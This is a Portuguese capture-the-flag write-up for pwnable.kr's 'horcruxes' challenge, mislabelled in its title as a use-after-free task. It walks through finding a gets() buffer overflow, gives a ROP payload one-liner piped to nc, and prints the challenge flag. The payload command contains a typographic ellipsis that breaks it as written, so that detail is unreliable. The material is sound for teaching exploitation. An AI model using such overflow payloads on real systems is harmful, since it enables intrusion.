# Duckware Team - uaf (pwnable)
###### Solved by @Antonio-alexandre

> This CTF is about pwn, rop,

## Desafio: uaf (Pwn, Use After Free)
#### Introdução

A lógica que o código adota é: uma história baseada em Harry Potter, onde o jogador precisa 'derrotar' o Voldemort. Para isso, o sistema pergunta a quantidade de pontos de experiência que foram coletados após colectar cada Horcrux. Caso o jogador não tenha coletado todas, ele não possuirá pontos de experiência suficientes para enfrentar Voldemort.

- [Página do desafio](http://pwnable.kr/play.php)

#### Análise Inicial

A princípio, nos deparamos com a seguinte descrição: 

> Voldemort escondeu sua alma dividida dentro de 7 horcruxes.
Encontre todas as horcruxes e ROP!
Autor: Jiwon Choi

Além do seguinte código para conectar ao servidor:

`ssh horcruxes@pwnable.kr -p2222 (pw:guest)` 

#### Solução

Assim que conectamos ao servidor, nos deparamos com a seguinte tela:

[![Imagem21.png](https://i.postimg.cc/P54GKkK2/Imagem21.png)](https://postimg.cc/LJn06wc1)

Dentro do servidor, há dois arquivos:

`horcruxes` `readme`

Ao executar `cat readme`, ele nos retorna a seguinte mensagem:

[![Imagem22.png](https://i.postimg.cc/Px00Nfrr/Imagem22.png)](https://postimg.cc/N97dzcHW)

Ao tentar executar o horcruxes, ele nos retorna a seguinte tela:

[![Imagem23.png](https://i.postimg.cc/L4ZrwPNq/Imagem23.png)](https://postimg.cc/CdSPfRyY)

Nesse caso não temos informação alguma. Uma técnica que podemos utilizar é o comando `scp` para baixar os arquivos diretamente do servidor. Para isso, a sintaxe ficará assim:

`scp -r -P2222 horcruxes@pwnable.kr:~/ ./`

Feito isso, iremos abrir o código no `Ghidra` para analisar os binários:

Com o código aberto, identificamos três pontos cruciais:

> A `main` limita certos `syscalls`:

[![Imagem24.png](https://i.postimg.cc/ncGwfG7L/Imagem24.png)](https://postimg.cc/1f4Kp6vx)

> A função `init_ABCDEFG` gera sete números de A-G aleatoriamente:

[![Imagem25.png](https://i.postimg.cc/SxZTJQgF/Imagem25.png)](https://postimg.cc/sMh9LzFw)

> A função `ropme` permite adivinhar um número e chama a função `gets()`, onde nos deparamos com um `bof(Buffer Overflow)`

[![Imagem26.png](https://i.postimg.cc/R06Rh73K/Imagem26.png)](https://postimg.cc/cKWY58BL)

Como o nosso objetivo é explorar o `bof`, precisaremos executar a função `init_ABCDEFG` para gerar os números aleatórios.

O primeiro passo é executar o `gdb` em `horcruxes`, e executar `disas ropme`.

[![Imagem27.png](https://i.postimg.cc/rFw5z13s/Imagem27.png)](https://postimg.cc/DmRSMX23)

Após isso, criamos um breakpoint em `0x080a00e8` e obtemos o endereço de `eax` utilizando o comando `x $eax`.

Obtemos então o endereço: `0xffffdb54`

Após isso, criamos um breakpoint na última chamada (`0x080a0176`). Assim, obtemos o endereço de `esp`: `0xffffdbcc`.

Ao realizar o cálculo, obtemos 120 bytes de lixo entre eles. Ou seja, para que consigamos obter os endereços das `funções A-G` e o endereço do `jmp ropme` dentro da `main`, precisamos enviar esses 120 bytes.

Utilizamos então esse comando para extrair os endereços:

Combinando tudo, e convertendo para little-endian, utilizaremos o seguinte comando:

```
(echo 15; (for i in {1…120}; do printf %s 49; done;) | xxd -r -p; 
echo 4bfe09086afe090889fe0908a8fe0908c7fe0908e6fe090805ff0908fcff0908 0a | xxd -r -p; cat) | nc 0 9032 -q 1
```

Ele nos retorna o seguinte:

```
Voldemort concealed his splitted soul inside 7 horcruxes.
Find all horcruxes, and destroy it!

Select Menu:How many EXP did you earned? : You’d better get more experience to kill Voldemort
You found “Tom Riddle’s Diary” (EXP +471258802)
You found “Marvolo Gaunt’s Ring” (EXP ±1275143031)
You found “Helga Hufflepuff’s Cup” (EXP +845677748)
You found “Salazar Slytherin’s Locket” (EXP +194777572)
You found “Rowena Ravenclaw’s Diadem” (EXP +695561867)
You found “Nagini the Snake” (EXP ±1098361773)
You found “Harry Potter” (EXP +401832873)
Select Menu:235604058
How many EXP did you earned? : 235604058
```

Assim então, temos acesso a `flag`:

>`Magic_spell_1s_4vad4_K3daVr4!`
 
